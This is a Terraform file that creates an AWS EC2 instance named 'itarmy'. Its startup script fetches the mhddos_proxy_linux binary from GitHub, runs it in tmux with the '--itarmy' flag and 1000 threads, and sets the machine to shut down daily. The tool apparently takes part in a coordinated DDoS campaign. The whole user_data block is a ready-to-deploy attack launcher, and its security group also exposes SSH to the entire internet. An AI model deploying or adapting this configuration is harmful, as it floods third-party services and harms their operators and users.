provider "aws" {
}

data "aws_ami" "ubuntu" {
  most_recent = true
  owners      = ["099720109477"] # Canonical

  filter {
    name   = "name"
    values = ["ubuntu/images/hvm-ssd/ubuntu-jammy-22.04-amd64-server-*"]
  }
}

resource "aws_key_pair" "ubuntu" {
  key_name   = "ubuntu"
  public_key = file("~/.ssh/id_ed25519.pub")
}

resource "aws_security_group" "ssh" {
  name        = "ssh"
  description = "allow SSH access"

  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }

  tags = {
    "Name" = "ssh"
  }
}

resource "aws_instance" "itarmy" {
  ami                                  = data.aws_ami.ubuntu.id
  instance_type                        = "t2.micro"
  instance_initiated_shutdown_behavior = "terminate"
  key_name                             = aws_key_pair.ubuntu.id
  vpc_security_group_ids               = [aws_security_group.ssh.id]

  user_data = <<-EOT
    Content-Type: multipart/mixed; boundary="//"
    MIME-Version: 1.0

    --//
    Content-Type: text/cloud-config; charset="us-ascii"
    MIME-Version: 1.0
    Content-Transfer-Encoding: 7bit
    Content-Disposition: attachment; filename="cloud-config.txt"

    #cloud-config
    cloud_final_modules:
    - [scripts-user, always]

    --//
    Content-Type: text/x-shellscript; charset="us-ascii"
    MIME-Version: 1.0
    Content-Transfer-Encoding: 7bit
    Content-Disposition: attachment; filename="userdata.txt"

    #!/usr/bin/env bash
    apt update
    timedatectl set-timezone Europe/Kiev
    shutdown -P 19:00 --no-wall
    su - ubuntu << EOF
    mkdir -p ~/bin
    wget https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux -O ~/bin/mhddos_proxy_linux && chmod 755 ~/bin/mhddos_proxy_linux
    tmux new -ds itarmy
    tmux send 'mhddos_proxy_linux --itarmy -t 1000' Enter
    echo -e '"\\e[A": history-search-backward\n"\\e[B": history-search-forward' > ~/.inputrc
    EOF
    --//--
  EOT

  tags = {
    Name = "itarmy"
  }
}
